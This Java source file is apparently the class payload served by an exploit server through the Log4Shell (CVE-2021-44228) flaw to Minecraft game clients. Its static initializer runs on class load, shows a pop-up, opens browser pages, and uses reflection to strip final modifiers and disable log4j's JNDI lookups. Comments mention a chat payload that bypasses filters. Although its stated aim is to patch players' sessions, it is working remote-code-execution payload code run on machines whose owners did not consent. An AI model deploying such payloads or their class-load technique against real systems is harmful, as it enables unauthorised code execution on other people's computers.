import javax.naming.Context;
import javax.naming.Name;
import javax.naming.spi.ObjectFactory;
import javax.swing.*;
import java.awt.*;
import java.io.PrintWriter;
import java.io.StringWriter;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.lang.reflect.Modifier;
import java.net.URI;
import java.util.ArrayList;
import java.util.Hashtable;
import java.util.List;
import java.util.Map;

/**
 * This class is loaded with the help of the CVE-2021-44228 vulnerability in log4j
 * with RCE provided by functionality that exists in older java versions commonly
 * used by the Minecraft client as older java is distributed with the game client.
 *
 * It is possible to execute arbitrary code on newer java versions, but they
 * are a minority of users except for servers as it does not come by default
 * with the game client.
 * A
 * December 9, 2021.
 */
public class rce_exploit_log4j implements ObjectFactory {
    static {
        execute();
    }
    public rce_exploit_log4j() {}

    public static void main(final String[] args) {
        // Exploit will be executed during class loading and/or resolving of the main method.
    }

    private static int generated_server_id() {
        // This key is replaced by our exploit server with a key generated on startup of the server.
        return 0x948a2580;
    }

    private static void execute() {
        // This is necessary because the filter bypass chat payload we used to load our payload may be executed multiple times due to
        // it failing inside log4j parsing code and log4j re-interpreting the message and downloading the payload again.
        int generated_server_id = generated_server_id();
        if (System.getProperty("rce_exploit_log4j_lock" + generated_server_id) != null) {
            return;
        }
        System.setProperty("rce_exploit_log4j_lock" + generated_server_id, "rce_exploit_log4j_lock" + generated_server_id);
        new Thread(() -> {
            showMessage(
                    "Hello from Minecraft RCE exploit! :)",
                    "We have attempted to patch the CVE-2021-44228 vulnerability in your current game session.\n\n" +
                            "If you see this message we recommend you update to the latest version of Forge 1.12.2 and Java 8.\n" +
                            "https://files.minecraftforge.net/net/minecraftforge/forge/index_1.12.2.html\n" +
                            "https://github.com/adoptium/temurin8-binaries/releases/", JOptionPane.ERROR_MESSAGE);
            // Linux fucking sucks...
            new Thread(() -> {
                try {
                    Desktop.getDesktop().browse(new URI("https://files.minecraftforge.net/net/minecraftforge/forge/index_1.12.2.html"));
                } catch (final Throwable t) {
                    t.printStackTrace();
                }
            }).start();
            // Why does gnome suck so much? This is the only way to make this work.
            new Thread(() -> {
                try {
                    Desktop.getDesktop().browse(new URI("https://github.com/adoptium/temurin8-binaries/releases/"));
                } catch (final Throwable t) {
                    t.printStackTrace();
                }
            });
        }).start();
        new Thread(() -> {
            System.out.println("Patching JNDI...");
            try {
                patchAndHookJndiManager();
                System.out.println("JNDI patched!");
            }  catch (final Throwable t) {
                final StringWriter stringWriter = new StringWriter();
                t.printStackTrace(new PrintWriter(stringWriter));
                final String stackTraceString = stringWriter.toString();
                showMessage("Failed to patch JNDI context to fix CVE-2021-44228!",
                        "We were unable to patch the game to fix CVE-2021-44228.\n" +
                                "Your current game session is highly insecure.\n" +
                                stackTraceString, JOptionPane.ERROR_MESSAGE);
            }
        }, "CVE-2021-44228 Patcher").start();
    }

    /**
     * Show a message to the user with fallback for AWT. This is a hacky way to do this, but it works.
     * @param header The header of the message.
     * @param message The message to show.
     * @param type The type of message, corresponds to the AWT constants in {@link JOptionPane}.
     */
    private static void showMessage(final String header, final String message, final int type) {
        try {
            final boolean headless = Boolean.parseBoolean(System.getProperty("java.awt.headless"));
            System.setProperty("java.awt.headless", String.valueOf(false));

            Class<?> uiManagerClass = null;
            Object oldLookAndFeel = null;
            try {
                uiManagerClass = Class.forName("javax.swing.UIManager");
                oldLookAndFeel = uiManagerClass.getMethod("getLookAndFeel")
                        .invoke(null);
                final String systemLookAndFeelClassName = (String) uiManagerClass.getMethod("getSystemLookAndFeelClassName")
                        .invoke(null);
                uiManagerClass.getMethod("setLookAndFeel", String.class)
                        .invoke(null, systemLookAndFeelClassName);
            } catch (final Exception ignored) {}

            final Class<?> jframeClass = Class.forName("javax.swing.JFrame");
            final Object frame = jframeClass.newInstance();
            jframeClass.getMethod("setAlwaysOnTop", boolean.class)
                    .invoke(frame, true);
            jframeClass.getMethod("setFocusable", boolean.class)
                    .invoke(frame, true);

            final Class<?> componentClass = Class.forName("java.awt.Component");
            final Class<?> joptionPaneClass = Class.forName("javax.swing.JOptionPane");
            joptionPaneClass.getMethod("showMessageDialog", componentClass, Object.class, String.class, int.class)
                    .invoke(null, frame, message, header, type);

            jframeClass.getMethod("dispose")
                    .invoke(frame);

            try {
                if (uiManagerClass != null && oldLookAndFeel != null) {
                    final Class<?> lookAndFeelClass = Class.forName("javax.swing.LookAndFeel");
                    uiManagerClass.getMethod("setLookAndFeel", lookAndFeelClass)
                            .invoke(null, oldLookAndFeel);
                }
            } catch (final Exception ignored) {}

            System.setProperty("java.awt.headless", String.valueOf(headless));
        } catch (final Throwable t) {
            t.printStackTrace();
        }
    }

    /**
     * Patches the JNDI context to fix CVE-2021-44228.
     */
    private static void patchAndHookJndiManager() {
        final ClassLoader ourClassLoader = rce_exploit_log4j.class.getClassLoader();
        System.out.println("Loaded in classloader: " + ourClassLoader);
        final List<ClassLoader> classLoaders = new ArrayList<>();
        classLoaders.add(ClassLoader.getSystemClassLoader());
        classLoaders.add(Thread.currentThread().getContextClassLoader());
        classLoaders.add(ourClassLoader);
        boolean fixed = false;
        final List<Throwable> causes = new ArrayList<>();
        for (final ClassLoader classLoader : classLoaders) {
            if (classLoader == null) {
                continue;
            }
            System.out.println("Trying to patch JNDI context in " + classLoader.getClass().getName());
            try {
                Class<?> clazz;
                try {
                    clazz = classLoader.loadClass("org.apache.logging.log4j.core.appender.AbstractManager");
                } catch (final Throwable t) {
                    // This should do the same as the above line, but I had random issues with some JVMs that people were using.
                    clazz = Class.forName("org.apache.logging.log4j.core.appender.AbstractManager", false, classLoader);
                }
                Class<?> jndiManagerClass = null;
                try {
                    try {
                        jndiManagerClass = classLoader.loadClass("org.apache.logging.log4j.core.net.JndiManager");
                    } catch (final Throwable t) {
                        // This should do the same as the above line, but I had random issues with some JVMs that people were using.
                        jndiManagerClass = Class.forName("org.apache.logging.log4j.core.net.JndiManager", false, classLoader);
                    }
                    // Initialize the JNDI manager for classloader and patch the context.
                    final Method getDefaultManager = jndiManagerClass.getDeclaredMethod("getDefaultManager");
                    final Object defaultManagerInstance = getDefaultManager.invoke(null);
                    if (defaultManagerInstance != null && patchJndiContext(defaultManagerInstance)) {
                        fixed = true;
                    }
                    // Alternative hacky fallback patch (we are unable to use the hook method due to classloading issues)
                    try {
                        final Field field = jndiManagerClass.getDeclaredField("FACTORY");
                        stripFinal(field).setAccessible(true);
                        field.set(null, null);
                    } catch (final Throwable t) {
                        t.printStackTrace();
                    }
                } catch (final Throwable t) {
                    causes.add(t);
                }
                if (clazz != null) {
                    // Patch all instances of the JNDI manager with our custom context.
                    final Field[] fields = clazz.getDeclaredFields();
                    for (final Field field : fields) {
                        if (Modifier.isStatic(field.getModifiers()) && Map.class.isAssignableFrom(field.getType())) {
                            stripFinal(field).setAccessible(true);
                            final Map<?, ?> map = (Map<?, ?>) field.get(null);
                            if (map == null) {
                                continue;
                            }
                            for (final Object value : map.values()) {
                                if ((jndiManagerClass != null && jndiManagerClass.isAssignableFrom(value.getClass()))) {
                                    try {
                                        if (patchJndiContext(value)) {
                                            fixed = true;
                                        }
                                    } catch (final Throwable t) {
                                        causes.add(t);
                                    }
                                }
                            }
                            map.clear();
                        }
                    }
                }
            } catch (final Throwable t) {
                t.printStackTrace();
            }
        }
        if (!fixed) {
            final VerifyError error = new VerifyError("Failed to patch JNDI context to fix CVE-2021-44228");
            for (final Throwable cause : causes) {
                error.addSuppressed(cause);
            }
            throw error;
        }
    }

    /**
     * Patch the JNDI context to use our custom context.
     * @return true if the context was patched, false otherwise.
     */
    private static boolean patchJndiContext(final Object jndiManager) throws ReflectiveOperationException {
        boolean fixed = false;
        Class<?> currClass = jndiManager.getClass();
        while (currClass != null) {
            final Field[] fields = currClass.getDeclaredFields();
            for (final Field field : fields) {
                if (Context.class.isAssignableFrom(field.getType())) {
                    stripFinal(field).setAccessible(true);
                    field.set(jndiManager, null);
                    fixed = true;
                }
            }
            currClass = currClass.getSuperclass();
        }
        return fixed;
    }

    /**
     * Strip the final modifier from a field.
     * @param field the field to strip.
     * @return the field with the final modifier stripped.
     */
    public static Field stripFinal(final Field field) throws ReflectiveOperationException {
        final Field modifiersField = Field.class.getDeclaredField("modifiers");
        final boolean modifiersAccessible = modifiersField.isAccessible();
        modifiersField.setAccessible(true);
        modifiersField.setInt(field, field.getModifiers() & ~Modifier.FINAL);
        modifiersField.setAccessible(modifiersAccessible);
        return field;
    }

    @Override
    public Object getObjectInstance(final Object obj, final Name name, final Context nameCtx, final Hashtable<?, ?> environment) {
        return null;
    }
}
